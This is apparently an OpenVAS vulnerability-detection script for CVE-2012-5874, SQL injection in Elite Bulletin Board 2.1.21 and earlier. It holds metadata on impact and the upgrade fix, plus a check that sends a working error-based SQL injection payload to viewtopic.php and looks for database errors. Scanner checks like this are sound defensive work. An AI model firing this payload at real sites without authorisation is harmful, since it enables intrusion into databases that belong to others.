##############################################################################
# OpenVAS Vulnerability Test
#
# Elite Bulletin Board Multiple SQL Injection Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (C) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803132");
  script_version("2022-04-27T12:01:52+0000");
  script_cve_id("CVE-2012-5874");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2022-04-27 12:01:52 +0000 (Wed, 27 Apr 2022)");
  script_tag(name:"creation_date", value:"2012-12-27 15:24:00 +0530 (Thu, 27 Dec 2012)");
  script_name("Elite Bulletin Board Multiple SQL Injection Vulnerabilities");

  script_xref(name:"URL", value:"http://secunia.com/advisories/51622/");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/57000");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/80760");
  script_xref(name:"URL", value:"http://seclists.org/bugtraq/2012/Dec/113");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/23575/");
  script_xref(name:"URL", value:"https://www.htbridge.com/advisory/HTB23133");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to compromise the
  application, access or modify data or exploit vulnerabilities in the
  underlying database.");

  script_tag(name:"affected", value:"Elite Bulletin Board version 2.1.21 and prior");

  script_tag(name:"insight", value:"Input appended to the URL after multiple scripts is not properly sanitised
  within the 'update_whosonline_reg()' and 'update_whosonline_guest()'
  functions (includes/user_function.php) before being used in a SQL query.");

  script_tag(name:"solution", value:"Upgrade to Elite Bulletin Board 2.1.22 or later.");

  script_tag(name:"summary", value:"Elite Bulletin Board is prone to multiple SQL injection vulnerabilities.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");
  script_xref(name:"URL", value:"http://elite-board.us/");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port(default:80);

if(!http_can_host_php(port:port))
  exit(0);

foreach dir(make_list_unique("/", "/ebbv", "/ebbv2", http_cgi_dirs(port:port)))
{

  if(dir == "/") dir = "";
  url = dir + "/index.php";
  res = http_get_cache( item:url, port:port );
  if( isnull( res ) ) continue;

  if( res =~ "^HTTP/1\.[01] 200" && ">Elite Bulletin Board<" >< res ) {

    url = dir +  "/viewtopic.php/%27,%28%28select*from%28select%20" +
          "name_const%28version%28%29,1%29,name_co%20nst%28version%28%29" +
          ",1%29%29a%29%29%29%20--%20/?bid=1&tid=1";

    if(http_vuln_check(port:port, url:url, pattern:'/includes/db.php',
     extra_check: make_list("MySQL server", "SQL Command", "Grouplist")))
    {
      security_message(port:port);
      exit(0);
    }
  }
}

exit(99);
